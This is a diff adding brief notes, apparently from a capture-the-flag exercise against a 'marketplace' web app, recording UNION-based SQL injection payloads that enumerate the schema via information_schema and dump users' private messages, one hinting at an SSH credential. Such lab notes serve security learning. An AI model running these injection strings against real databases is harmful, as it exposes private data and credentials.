@@ -1,0 +1,8 @@
+-1 UNION SELECT 1,2,3,4 => 4 columns in users
+-1 UNION SELECT database(),2,3,4 => marketplace ( it will print for the id ) 
+-1 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables WHERE table_schema = 'marketplace' (users,messages,listing(forgot this name)
+-1 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name = 'messages' ( nothing in users lost me one hour :x  ) => user_to,user_from,message_content
+-1 0 UNION SELECT group_concat(user_to,':',message_content SEPARATOR '<br>'),2,3,4 FROM "messages" => User3:change ssh password thing
+
+ps: just go back the admin display and the find the user with id =3
+
